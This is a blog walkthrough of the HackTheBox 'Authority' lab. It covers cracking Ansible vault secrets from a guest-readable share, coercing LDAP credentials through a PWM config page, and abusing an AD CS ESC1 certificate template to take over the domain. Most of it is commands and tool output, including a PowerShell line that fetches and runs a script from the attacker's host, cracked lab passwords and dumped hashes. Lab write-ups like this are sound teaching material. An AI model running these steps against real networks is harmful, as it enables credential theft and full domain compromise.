<!doctype html><html lang=en dir=auto data-theme=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Becoming the Authority: An AD CS Exploit on HTB 'Authority' | Fieryrival's Blog</title><meta name=keywords content="windows,AD,adcs,medium,hackthebox,ldap,ansible,esc1"><meta name=description content="Walkthrough of a medium-rated Windows AD box involving LDAP manipulation, cracking an Ansible vault, and escalating to Domain Admin via the AD CS ESC1 exploit."><meta name=author content><link rel=canonical href=//localhost:1313/posts/authority/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=//localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=//localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=//localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=//localhost:1313/apple-touch-icon.png><link rel=mask-icon href=//localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:1313/posts/authority/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="//localhost:1313/posts/authority/"><meta property="og:site_name" content="Fieryrival's Blog"><meta property="og:title" content="Becoming the Authority: An AD CS Exploit on HTB 'Authority'"><meta property="og:description" content="Walkthrough of a medium-rated Windows AD box involving LDAP manipulation, cracking an Ansible vault, and escalating to Domain Admin via the AD CS ESC1 exploit."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-20T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-20T00:00:00+00:00"><meta property="article:tag" content="Windows"><meta property="article:tag" content="AD"><meta property="article:tag" content="Adcs"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Hackthebox"><meta property="article:tag" content="Ldap"><meta property="og:image" content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Becoming the Authority: An AD CS Exploit on HTB 'Authority'"><meta name=twitter:description content="Walkthrough of a medium-rated Windows AD box involving LDAP manipulation, cracking an Ansible vault, and escalating to Domain Admin via the AD CS ESC1 exploit."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Becoming the Authority: An AD CS Exploit on HTB 'Authority'","item":"//localhost:1313/posts/authority/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Becoming the Authority: An AD CS Exploit on HTB 'Authority'","name":"Becoming the Authority: An AD CS Exploit on HTB \u0027Authority\u0027","description":"Walkthrough of a medium-rated Windows AD box involving LDAP manipulation, cracking an Ansible vault, and escalating to Domain Admin via the AD CS ESC1 exploit.","keywords":["windows","AD","adcs","medium","hackthebox","ldap","ansible","esc1"],"articleBody":"Authority Box Info This was a medium-rated AD box created by mrb3n and Sentinal920. In this box, an Ansible Vault was utilized to extract credentials for PWM. These credentials were subsequently employed on a PWM instance. The PWM instance could be configured to manipulate LDAP authentication, coercing it into attacking a server to capture credentials. Following this, an exploitation of a vulnerable certificate template was carried out to gain domain administrator privileges.\nRecon Nmap # Nmap 7.92 scan initiated Tue Nov 28 14:55:35 2023 as: nmap -p- --min-rate 5000 -v -oN full -sV 10.10.11.222 Nmap scan report for authority.authority.htb (10.10.11.222) Host is up (0.051s latency). Not shown: 65505 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-11-28 19:56:09Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8443/tcp open ssl/https-alt 9389/tcp open adws? 35744/tcp filtered unknown 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 47072/tcp filtered unknown 49058/tcp filtered unknown 49664/tcp open unknown 49665/tcp open tcpwrapped 49666/tcp open unknown 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open unknown 49688/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49689/tcp open unknown 49691/tcp open unknown 49692/tcp open unknown 49700/tcp open msrpc Microsoft Windows RPC 49709/tcp open unknown 49713/tcp open unknown 49732/tcp open unknown Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Nov 28 14:57:36 2023 -- 1 IP address (1 host up) scanned in 121.58 seconds Several ports are open including DNS(53), Kerberos (88), SMB, LDAP, RPC, and WINRM. It’s most likely a domain controller.\nWe can start with the automatic enumeration script enum4linux.py, It gives us the domain name, FQDN, and some information about the operating system and RPC port.\n[--SNIP--] =========================================================== | Domain Information via SMB session for 10.10.11.222 | =========================================================== [*] Enumerating via unauthenticated SMB session on 445/tcp [+] Found domain information via SMB NetBIOS computer name: AUTHORITY NetBIOS domain name: HTB DNS domain: authority.htb FQDN: authority.authority.htb Derived membership: domain member Derived domain: HTB [--SNIP--] SMB Enumeration We started with testing for a null session which was disabled, moving on to the guest session, where it was enabled.\nTwo shares i.e. Development and IPC$ are readable.\nroot@81eb036f84ce:/usr/src/crackmapexec# cme smb 10.10.11.222 -u 'guest' -p '' --shares SMB 10.10.11.222 445 AUTHORITY [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\guest: SMB 10.10.11.222 445 AUTHORITY [*] Enumerated shares SMB 10.10.11.222 445 AUTHORITY Share Permissions Remark SMB 10.10.11.222 445 AUTHORITY ----- ----------- ------ SMB 10.10.11.222 445 AUTHORITY ADMIN$ Remote Admin SMB 10.10.11.222 445 AUTHORITY C$ Default share SMB 10.10.11.222 445 AUTHORITY Department Shares SMB 10.10.11.222 445 AUTHORITY Development READ SMB 10.10.11.222 445 AUTHORITY IPC$ READ Remote IPC SMB 10.10.11.222 445 AUTHORITY NETLOGON Logon server share SMB 10.10.11.222 445 AUTHORITY SYSVOL Logon server share Since IPC$ is readable we can attempt RID cycling.\nroot@81eb036f84ce:/usr/src/crackmapexec# cme smb 10.10.11.222 -u 'guest' -p '' --rid SMB 10.10.11.222 445 AUTHORITY [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\guest: SMB 10.10.11.222 445 AUTHORITY 498: HTB\\Enterprise Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 500: HTB\\Administrator (SidTypeUser) SMB 10.10.11.222 445 AUTHORITY 501: HTB\\Guest (SidTypeUser) SMB 10.10.11.222 445 AUTHORITY 502: HTB\\krbtgt (SidTypeUser) SMB 10.10.11.222 445 AUTHORITY 512: HTB\\Domain Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 513: HTB\\Domain Users (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 514: HTB\\Domain Guests (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 515: HTB\\Domain Computers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 516: HTB\\Domain Controllers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 517: HTB\\Cert Publishers (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 518: HTB\\Schema Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 519: HTB\\Enterprise Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 520: HTB\\Group Policy Creator Owners (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 521: HTB\\Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 522: HTB\\Cloneable Domain Controllers (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 525: HTB\\Protected Users (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 526: HTB\\Key Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 527: HTB\\Enterprise Key Admins (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 553: HTB\\RAS and IAS Servers (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 571: HTB\\Allowed RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 572: HTB\\Denied RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 1000: HTB\\AUTHORITY$ (SidTypeUser) SMB 10.10.11.222 445 AUTHORITY 1101: HTB\\DnsAdmins (SidTypeAlias) SMB 10.10.11.222 445 AUTHORITY 1102: HTB\\DnsUpdateProxy (SidTypeGroup) SMB 10.10.11.222 445 AUTHORITY 1601: HTB\\svc_ldap (SidTypeUser) After obtaining a list of users (in this case, we only have svc_ldap), we can attempt AS-REProasting to steal password hashes of users who have Kerberos pre-authentication disabled. However, there were no vulnerable accounts found.\nReadable Development Folder This folder had quite a good amount of files and folders which could have some sensitive info. So, let’s download and have a look.\n┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $smbclient \\\\\\\\10.10.11.222\\\\Development -U 'guest%' Try \"help\" to get a list of possible commands. smb: \\\u003e dir . D 0 Fri Mar 17 09:20:38 2023 .. D 0 Fri Mar 17 09:20:38 2023 Automation D 0 Fri Mar 17 09:20:40 2023 5888511 blocks of size 4096. 1519101 blocks available smb: \\\u003e prompt off smb: \\\u003e recurse on smb: \\\u003e mget * Found and tested some credentials hardcoded for Tomcat but they were of no use to us.\nCracking Ansible Vault Secrets Sensitive information was discovered in the file Ansible/PWM/defaults/main.yml within the PWM folder. This file contained Ansible vault secrets.\nAnsible vault is a feature that allows users to keep sensitive data such as passwords or keys in encrypted files rather than plaintext in playbooks or roles. These vault files can then be distributed or placed in source control.\nText from main.yml\n--- pwm_run_dir: \"{{ lookup('env', 'PWD') }}\" pwm_hostname: authority.htb.corp pwm_http_port: \"{{ http_port }}\" pwm_https_port: \"{{ https_port }}\" pwm_https_enable: true pwm_require_ssl: false pwm_admin_login: !vault | $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531 ldap_uri: ldap://127.0.0.1/ ldap_base_dn: \"DC=authority,DC=htb\" ldap_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764 We can follow snovvcrash’s article to crack the ansible vaults from our files.\nFirst, we extracted the vault secrets in the proper format required for the next step.\n┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $cat h1 $ANSIBLE_VAULT;1.1;AES256 326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438 Then we need to convert it into hash which could be processed by hashcat.\n┌─[✗]─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $/usr/share/john/ansible2john.py h1 h1:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8 Note here I had to remove the filename i.e. h1: part and the file should only contain the hash.\nWe were then able to crack the vault password with hashcat mode 16900.\n$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^\u0026* Session..........: hashcat Status...........: Cracked Hash.Name........: Ansible Vault Hash.Target......: $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2...bc2cd8 Time.Started.....: Wed Nov 29 09:16:11 2023 (18 secs) Time.Estimated...: Wed Nov 29 09:16:29 2023 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2228 H/s (6.31ms) @ Accel:512 Loops:128 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 39936/14344385 (0.28%) Rejected.........: 0/39936 (0.00%) Restore.Point....: 38400/14344385 (0.27%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9984-9999 Candidates.#1....: jonah1 -\u003e prospect Started: Wed Nov 29 09:15:24 2023 Stopped: Wed Nov 29 09:16:33 2023 ┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $/usr/share/john/ansible2john.py pwm_admin_password | awk -F ':' '{print $2}' $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5 ┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $/usr/share/john/ansible2john.py pwm_admin_password | awk -F ':' '{print $2}' \u003e pwm_admin_password_hash Upon inspecting all three vaults, it was observed that each one shared the same vault password. The next step involved decrypting the vault to access and read the sensitive information within.\nAs per the instructions we get three different secrets i.e. ldap_admin_password, pwm_admin_password, and pwm_admin_login.\n┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $cat ldap_admin_password | ansible-vault decrypt Vault password: Decryption successful DevT3st@123┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $cat pwm_admin_password | ansible-vault decrypt Vault password: Decryption successful pWm_@dm!N_!23┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $cat pwm_admin_login | ansible-vault decrypt Vault password: Decryption successful svc_pwm I kept a note of the three for further enumeration.\nIIS default page at TCP 80 Port 80 didn’t have much info and directory enumeration with fuff didn’t give much either. So we can move on to other ports.\nPWM at Port 8443 PWM is an open-source password self-service application for LDAP directories. It has a web-based configuration manager running on port 8443. Just visiting the website greeted us with a message that PWM was currently running in configuration mode.\nWe can use the credentials extracted from the Ansible vault to log in to the config editor.\nThe username was svc_pwm and the password was pWm_@dm!N_!23. We were able to log in to the web portal and it had different configuration options we could play with. One of them that piqued my interest was LDAP settings and apparently, we could test that particular setting. This could be used to coerce authentication to the attacker’s server and leak credentials.\nWe were able to successfully coerce authentication to our server and gather sensitive information and in this case clear-text credentials.\nSince I had tried this multiple times, the clear text credentials could be found in the logs of responder.\n┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $cat /usr/share/responder/logs/LDAP-Cleartext-ClearText-10.10.11.222.txt b'CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb':b'lDaP_1n_th3_cle4r!' b'CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb':b'lDaP_1n_th3_cle4r!' Since I have credentials for svc_ldap account, I tried to enumerate LDAP information from ldapsearch but couldn’t. My understanding here was that LDAP was configured to work only in LDAPS and that I couldn’t get to work so I moved on to crackmapexec for this.\n┌─[noob@parrot]─[~/htb/authority/notes/smb_development] └──╼ $ldapsearch -x -H ldap://10.10.11.222 -D 'authority\\svc_ldap' -w 'lDaP_1n_th3_cle4r!' -b 'DC=authority,DC=htb' '(objectClass=user)' ldap_bind: Invalid credentials (49) additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563 Confirmed that the credentials for svc_ldap were correct and also that this user had WINRM access over the domain.\nroot@a5c35e0df3f9:/usr/src/crackmapexec# cme winrm 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' SMB 10.10.11.222 5985 AUTHORITY [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb) HTTP 10.10.11.222 5985 AUTHORITY [*] http://10.10.11.222:5985/wsman HTTP 10.10.11.222 5985 AUTHORITY [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!) Post Credential Enumeration After logging into the machine, I checked the user’s privileges and if it was a member of any vulnerable group.\nSince there were few users, I tried enumerating initially with Winpeas and then moved on to Adpeas which showed some suspicious server certificates.\n*Evil-WinRM* PS C:\\windows\\tasks\u003e iex(iwr 10.10.14.112:8000/adPEAS.ps1 -UseBasicParsing) It can be seen that the template “CorpVPN” has ENROLLEE_SUPPLIES_SUBJECT flag as true and Domain Computer has enrolment rights for this template.\n[?] +++++ Checking Template 'CorpVPN' +++++ [!] Template 'CorpVPN' has Flag 'ENROLLEE_SUPPLIES_SUBJECT' [+] Identity 'HTB\\Domain Computers' has enrollment rights for template 'CorpVPN' Template Name:\tCorpVPN Template distinguishedname:\tCN=CorpVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb Date of Creation:\t03/24/2023 23:48:09 [+] Extended Key Usage:\tEncrypting File System, Secure E-mail, Client Authentication, Document Signing, 1.3.6.1.5.5.8.2.2, IP Security User, KDC Authentication EnrollmentFlag:\tINCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE [!] CertificateNameFlag:\tENROLLEE_SUPPLIES_SUBJECT [+] Enrollment allowed for:\tHTB\\Domain Computers This vulnerability could be easily confirmed with certipy.\n(venv) ┌─[✗]─[noob@parrot]─[~/htb/authority/notes/certs] └──╼ $certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable -stdout Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 37 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 13 enabled certificate templates [*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA [!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for 'AUTHORITY-CA' [*] Enumeration output: Certificate Authorities 0 CA Name : AUTHORITY-CA DNS Name : authority.authority.htb Certificate Subject : CN=AUTHORITY-CA, DC=authority, DC=htb Certificate Serial Number : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4 Certificate Validity Start : 2023-04-24 01:46:26+00:00 Certificate Validity End : 2123-04-24 01:56:25+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : AUTHORITY.HTB\\Administrators Access Rights ManageCertificates : AUTHORITY.HTB\\Administrators AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins ManageCa : AUTHORITY.HTB\\Administrators AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins Enroll : AUTHORITY.HTB\\Authenticated Users Certificate Templates 0 Template Name : CorpVPN Display Name : Corp VPN Certificate Authorities : AUTHORITY-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : AutoEnrollmentCheckUserDsCertificate PublishToDs IncludeSymmetricAlgorithms Private Key Flag : 16777216 65536 ExportableKey Extended Key Usage : Encrypting File System Secure Email Client Authentication Document Signing IP security IKE intermediate IP security use KDC Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 20 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : AUTHORITY.HTB\\Domain Computers AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins Object Control Permissions Owner : AUTHORITY.HTB\\Administrator Write Owner Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator Write Dacl Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator Write Property Principals : AUTHORITY.HTB\\Domain Admins AUTHORITY.HTB\\Enterprise Admins AUTHORITY.HTB\\Administrator [!] Vulnerabilities ESC1 : 'AUTHORITY.HTB\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication ADCS (Active Directory Certificate Services) AD CS is a server role that functions as Microsoft’s public key infrastructure PKI implementation. As expected, it integrates tightly with Active Directory. It enables the issuing of certificates, which are X.509-formatted digitally signed electronic documents that can be used for encryption, message signing, and/or authentication (our research focus). One important thing to note for ADCS is that certificates are independent authentication material and will be valid even if the user (or computer) resets the password.\n[source: https://posts.specterops.io/certified-pre-owned-d95910965cd2 ]\nWe can check the requirements for ESC1 ➖\nEnterprise CA grants Domain Computers enrolment rights. Manager approval is disabled. No authorization signatures are required Certificate template security descriptor grants certificate enrolment rights to Domain Computers Certificate templates define EKU that enable authentication. (Here we have Client Authentication) The certificate template allows the requester to specify subjectAltName (SAN) in the certificate signing request. (Enrollee supplies subject is set to True) *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled The account svc_ldap has the privilege of adding a computer to the domain. The script addcomputer.py can be used to add a computer to the domain.\n┌─[✗]─[noob@parrot]─[~/htb/authority/notes/certs] └──╼ $addcomputer.py -computer-name 'NOOB$' -computer-pass 'n00brival' -dc-ip 10.10.11.222 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra [*] Successfully added machine account NOOB$ with password n00brival. (venv) ┌─[noob@parrot]─[~/htb/authority/notes/certs] └──╼ $certipy req -u 'NOOB$@authority.htb' -p 'n00brival' -ca AUTHORITY-CA -target authority.authority.htb -template CorpVPN -upn administrator@authority.htb -debug Certipy v4.8.2 - by Oliver Lyak (ly4k) [+] Trying to resolve 'authority.authority.htb' at '10.0.2.3' [+] Trying to resolve 'AUTHORITY.HTB' at '10.0.2.3' [+] Generating RSA key [*] Requesting certificate via RPC [+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\\pipe\\cert] [+] Connected to endpoint: ncacn_np:10.10.11.222[\\pipe\\cert] [*] Successfully requested certificate [*] Request ID is 12 [*] Got certificate with UPN 'administrator@authority.htb' [*] Certificate has no object SID [*] Saved certificate and private key to 'administrator.pfx' Normally the PKCS #12 archive file could be used directly to get domain admin hashes or Kerberos tickets but in this box, it was not working. So had to switch to pass-the-cert attack.\nThe certificate and key can be separated from the extracted from the PKCS #12 (pfx) archive file.\n(venv) ┌─[noob@parrot]─[~/htb/authority/rdp] └──╼ $certipy cert -pfx administrator.pfx -nokey -out admin.crt Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Writing certificate and to 'admin.crt' (venv) ┌─[noob@parrot]─[~/htb/authority/rdp] └──╼ $certipy cert -pfx administrator.pfx -nocert -out admin.key Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Writing private key to 'admin.key' One way for dumping hashes and gaining domain admins was adding ourselves to domain admins or granting DCSYNC rights to attacker-controlled users. Since both are relatively new, I have covered both ways in the write-up.\n(venv) ┌─[✗]─[noob@parrot]─[~/htb/authority/notes/certs] └──╼ $python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222 Impacket v0.11.0 - Copyright 2023 Fortra Type help for list of commands # add_user_to_group svc_ldap \"Domain Admins\" Adding user: svc_ldap to group Domain Admins result: OK # Dumping domain hashes with secretsdump.py.\n┌─[noob@parrot]─[~/htb/authority/notes/certs] └──╼ $secretsdump.py 'svc_ldap:lDaP_1n_th3_cle4r!@authority.htb' Impacket v0.10.1.dev1+20230504.43204.0bdad34a - Copyright 2022 Fortra [*] Target system bootKey: 0x31f4629800790a973f9995cec47514c6 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:a15217bb5af3046c87b5bb6afa7b193e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information. [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC HTB\\AUTHORITY$:aes256-cts-hmac-sha1-96:d9eeaa12af484646fdc30d2a6d5b10abb90419f2d67636c0f225b98860ef8a67 HTB\\AUTHORITY$:aes128-cts-hmac-sha1-96:988f7118e6216de57982e2ad1bf64bfc HTB\\AUTHORITY$:des-cbc-md5:4946616e0d43f1a1 HTB\\AUTHORITY$:plain_password_hex:8c79a9d42ec010204f2858165f2129a9681bf557946a6d2c072c50a8c3eebbd35a5233f6cfa8b4ff8336bafb990d9c2cdbaaf96172582dee05387e31697a642aa2532e2626b09938aa3cc8c3d2ca3b8568bf6dd6ecd3e07500879b8e1c9df1eebfe1475c67736dd20b09656412be2915663a9ee6330678a00e7efa331330bc29f3e3f9550e0c86d27db3f20a04bc9f130d625c2e89972e0084c340a323aaa49e3a679aca9083fa5e166cbf4011027f2d9f363e3572e79e44a42acd9219b37dd1804eb80c1cfafce1a2cc6ffa1fa563ba3bc9763082241f4440ee138fdbf1669576616a6b4e4de2fed59bba6c7265abd4 HTB\\AUTHORITY$:aad3b435b51404eeaad3b435b51404ee:fd46a391cd96241d31c6cf3402c4c365::: [*] DPAPI_SYSTEM dpapi_machinekey:0xd5d60027f85b1132cef2cce88a52670918252114 dpapi_userkey:0x047c1e3ad8db9d688c3f1e9ea06c8f2caf002511 [*] NL$KM 0000 F9 41 4F E3 80 49 A5 BD 90 2D 68 32 F7 E3 8E E7 .AO..I...-h2.... 0010 7F 2D 9B 4B CE 29 B0 E6 E0 2C 59 5A AA B7 6F FF .-.K.)...,YZ..o. 0020 5A 4B D6 6B DB 2A FA 1E 84 09 35 35 9F 9B 2D 11 ZK.k.*....55..-. 0030 69 4C DE 79 44 BA E1 4B 5B BC E2 77 F4 61 AE BA iL.yD..K[..w.a.. NL$KM:f9414fe38049a5bd902d6832f7e38ee77f2d9b4bce29b0e6e02c595aaab76fff5a4bd66bdb2afa1e840935359f9b2d11694cde7944bae14b5bbce277f461aeba [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908::: svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1::: 